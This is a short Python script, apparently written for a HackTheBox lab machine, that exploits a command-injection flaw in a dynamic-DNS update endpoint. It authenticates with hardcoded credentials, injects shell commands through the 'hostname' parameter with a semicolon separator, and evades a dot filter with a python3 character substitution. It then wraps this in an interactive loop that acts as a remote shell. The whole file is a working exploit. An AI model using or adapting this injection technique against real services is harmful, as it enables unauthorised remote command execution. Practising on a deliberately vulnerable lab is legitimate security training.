import requests as rq

url = 'http://10.10.10.244/nic/update'
username = 'dynadns'
password = 'sndanyd'

def exec_cmd(cmd):
	cmd = cmd.replace('.', "$(python3 -c 'print(chr(0x2e))')")
	params = {
		'hostname': f'''";{cmd};a.no-ip.htb'''
	}
	res = rq.get(url, params=params, auth=(username, password)).text
	res = res.split('\n')[3:-2]
	print('\n'.join(res))
	return res

while True:
	cmd = input('cmd: ')
	exec_cmd(cmd)
	
